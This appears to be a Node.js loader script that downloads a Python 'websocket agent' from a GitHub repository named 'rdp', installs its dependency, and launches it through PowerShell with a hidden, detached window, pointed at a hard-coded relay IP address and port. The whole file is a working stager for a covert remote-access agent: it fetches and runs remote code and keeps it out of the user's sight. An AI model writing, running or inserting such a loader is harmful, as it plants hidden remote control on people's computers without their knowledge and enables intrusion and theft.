const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');

console.log('Starting WebSocket Agent Setup (Hidden Mode)...');

// Function to download a file from URL
function downloadFile(url, destination) {
    return new Promise((resolve, reject) => {
        console.log(`📥 Downloading: ${url}`);
        
        const protocol = url.startsWith('https:') ? https : http;
        const file = fs.createWriteStream(destination);
        
        protocol.get(url, (response) => {
            if (response.statusCode !== 200) {
                reject(new Error(`Failed to download: HTTP ${response.statusCode}`));
                return;
            }
            
            response.pipe(file);
            
            file.on('finish', () => {
                file.close();
                console.log(`✅ Downloaded: ${destination}`);
                resolve();
            });
            
            file.on('error', (err) => {
                fs.unlink(destination, () => {}); // Delete the file if it exists
                reject(err);
            });
        }).on('error', (err) => {
            reject(err);
        });
    });
}

// Function to run Python script completely hidden using PowerShell
function runPythonHidden(scriptPath, args = []) {
    return new Promise((resolve, reject) => {
        console.log(`Executing Python (hidden): ${scriptPath} ${args.join(' ')}`);
        
        // Use PowerShell to start Python with hidden window
        const psCommand = `Start-Process python -ArgumentList '${scriptPath}', '${args.join("', '")}' -WindowStyle Hidden -PassThru`;
        
        const child = spawn('powershell', ['-Command', psCommand], {
            stdio: ['ignore', 'pipe', 'pipe'],
            shell: true,
            detached: true,
            windowsHide: true
        });
        
        child.unref();
        
        // Get the process ID from PowerShell output
        child.stdout.on('data', (data) => {
            const output = data.toString().trim();
            if (output && !isNaN(output)) {
                console.log(`✅ Hidden Python process started with PID: ${output}`);
            }
        });
        
        child.stderr.on('data', (data) => {
            console.error(`[PowerShell Error] ${data.toString().trim()}`);
        });
        
        console.log('The Python agent is now running completely hidden.');
        console.log('No visible terminal window will be opened.');
        resolve();
        
        child.on('error', (error) => {
            console.error(`❌ Error executing command: ${error.message}`);
            reject(error);
        });
    });
}

async function startAgentHidden() {
    try {
        // Configuration - you can modify these URLs
        const pythonScriptUrl = process.env.PYTHON_SCRIPT_URL || 'https://raw.githubusercontent.com/Pharaon3/rdp/main/websocket_agent.py';
        const pythonScriptPath = 'websocket_agent.py';
        const relayHost = process.env.RELAY_HOST || '3.237.240.137';
        const relayPort = process.env.RELAY_PORT || '3000';
        const agentId = process.env.AGENT_ID || 'test';
        
        // Step 1: Download the Python script if it doesn't exist or if forced
        if (!fs.existsSync(pythonScriptPath) || process.env.FORCE_DOWNLOAD === 'true') {
            console.log('\n📥 Downloading Python script...');
            await downloadFile(pythonScriptUrl, pythonScriptPath);
        } else {
            console.log('\n📁 Python script already exists, skipping download');
        }
        
        // Step 2: Install websockets package
        console.log('\n📦 Installing websockets package...');
        const pipChild = spawn('pip', ['install', 'websockets'], {
            stdio: 'inherit',
            shell: true
        });
        
        await new Promise((resolve, reject) => {
            pipChild.on('close', (code) => {
                if (code === 0) {
                    console.log('✅ Websockets package installed');
                    resolve();
                } else {
                    reject(new Error(`Pip install failed with code ${code}`));
                }
            });
        });
        
        // Step 3: Run the websocket agent completely hidden
        console.log('\n🚀 Starting WebSocket agent in hidden mode...');
        await runPythonHidden(pythonScriptPath, [relayHost, relayPort, agentId]);
        
        console.log('\n✅ Setup complete! The agent is running completely hidden.');
        console.log('You can now close this terminal safely.');
        
    } catch (error) {
        console.error('❌ Failed to start agent:', error.message);
        process.exit(1);
    }
}

// Handle process termination
process.on('SIGINT', () => {
    console.log('\n🛑 Received SIGINT, shutting down gracefully...');
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n🛑 Received SIGTERM, shutting down gracefully...');
    process.exit(0);
});

// Start the agent
startAgentHidden(); 